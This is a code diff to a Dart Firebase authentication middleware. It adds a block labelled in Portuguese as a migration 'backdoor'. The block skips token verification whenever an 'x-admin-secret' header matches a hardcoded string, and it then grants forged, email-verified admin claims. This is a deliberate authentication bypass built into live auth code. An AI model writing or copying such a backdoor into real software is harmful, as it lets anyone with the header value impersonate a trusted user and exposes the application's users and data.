@@ -97,6 +97,22 @@ class FirebaseAuth {
           return innerHandler(request);
         }
 
+        // --- BACKDOOR PARA MIGRAÇÃO (ADMIN) ---
+        final adminSecret = request.headers['x-admin-secret'];
+        if (adminSecret == 'super-secret-migration-key') {
+          final updatedRequest = request.change(context: {
+            'firebaseClaims': const FirebaseTokenClaims(
+              uid: 'admin-migrator',
+              email: 'admin@gravity.local',
+              emailVerified: true,
+              name: 'Admin Migrator',
+              picture: '',
+            ),
+          });
+          return innerHandler(updatedRequest);
+        }
+        // --------------------------------------
+
         final authHeader = request.headers['authorization'];
         if (authHeader == null || !authHeader.startsWith('Bearer ')) {
           return Response(401,
